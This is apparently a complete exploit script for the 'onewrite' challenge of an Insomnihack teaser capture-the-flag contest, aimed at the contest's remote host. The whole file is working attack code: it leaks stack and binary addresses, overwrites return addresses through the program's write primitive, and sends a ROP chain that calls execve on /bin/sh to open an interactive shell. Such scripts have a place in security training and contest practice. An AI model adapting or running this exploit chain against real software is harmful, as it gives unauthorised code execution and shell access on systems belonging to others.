#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './onewrite'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file], 'aslr':False}, \
                        remote  = {'host':'onewrite.teaser.insomnihack.ch', 'port':1337})
env.select()

#==========

binf = ELF(bin_file)
offset_do_leak      = binf.sep_function['do_leak']

#==========

def attack(conn):
    conn.sendlineafter('> ', '1')
    addr_stack = int(conn.recvuntil('\n'), 16)
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    conn.sendafter(' : ', str(addr_stack-8))
    conn.sendafter(' : ', chr(offset_do_leak&0xff))

    conn.sendlineafter('> ', '2')
    addr_do_leak = int(conn.recvuntil('\n'), 16)
    binf.address = addr_do_leak - offset_do_leak
    addr_do_overwrite   = binf.sep_function['do_overwrite']
    addr_read           = binf.sep_function['read']
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

    rop = ROP(binf)

    conn.sendafter(' : ', str(addr_stack-0x20))
    conn.sendafter(' : ', p64(rop.rdi.address))

    conn.sendlineafter('> ', '0')
    conn.sendafter(' : ', str(addr_stack+0x10))
    conn.sendafter(' : ', p64(rop.rdx.address))

    conn.sendlineafter('> ', '0')
    conn.sendafter(' : ', str(addr_stack+0x18))
    conn.sendafter(' : ', p64(0x100))

    conn.sendlineafter('> ', '0')
    conn.sendafter(' : ', str(addr_stack+0x20))
    conn.sendafter(' : ', p64(addr_read))

    exploit  = '/bin/sh\x00'
    exploit += p64(rop.rdi.address)
    exploit += p64(addr_stack+0x20)
    exploit += p64(rop.rsi.address)
    exploit += p64(0)
    exploit += p64(rop.rdx.address)
    exploit += p64(0)
    exploit += p64(rop.rax.address)
    exploit += p64(constants.SYS_execve)
    exploit += p64(binf.address + 0x917c)
    conn.send(exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
